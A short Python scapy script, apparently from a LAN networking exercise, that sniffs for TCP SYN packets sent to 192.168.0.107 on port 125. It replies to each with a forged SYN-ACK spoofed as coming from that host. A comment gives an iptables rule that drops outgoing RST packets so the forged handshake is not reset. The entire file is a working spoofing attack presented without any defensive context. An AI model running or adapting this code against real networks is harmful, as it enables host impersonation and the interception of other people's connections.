from scapy.all import *
#important notice
#in order for the follwing code to work you have to run:
#iptables -A OUTPUT -p tcp -d 192.168.0.104 -s 192.168.0.107 --tcp-flags RST RST -j DROP

target_ip = '192.168.0.107'
def cback(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        src = packet[IP].src
        ack = packet[TCP].ack
        seq = packet[TCP].seq
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        send(IP(dst=src, src=target_ip)/TCP(flags='SA', seq=ack, ack=seq+1, sport=dport, dport=sport))
        print(src, ack, sport, dport)

interface='wlo1'
filter = 'dst host %s and tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0 and dst port 125'%target_ip
sniff(filter=filter, prn=cback, iface=interface, store=0)
